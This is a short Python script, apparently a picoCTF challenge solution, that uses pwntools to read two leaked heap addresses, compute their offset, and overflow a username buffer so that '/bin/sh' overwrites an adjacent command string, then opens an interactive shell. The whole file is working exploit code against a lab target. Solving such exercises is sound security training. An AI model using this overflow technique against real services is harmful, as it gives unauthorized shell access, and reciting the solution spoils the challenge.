from pwn import *

HOST, PORT = "amiable-citadel.picoctf.net", 65178
r = remote(HOST, PORT)
# r = process('./vuln')

r.recvuntil(b'username at ')
username = r.recvline().decode().strip()
r.recvuntil(b'shell at ')
shell = r.recvline().decode().strip()
r.recvuntil(b'username: ')
offset = int(shell, 16) - int(username, 16)
r.sendline(b'A' * offset + b'/bin/sh')

r.interactive()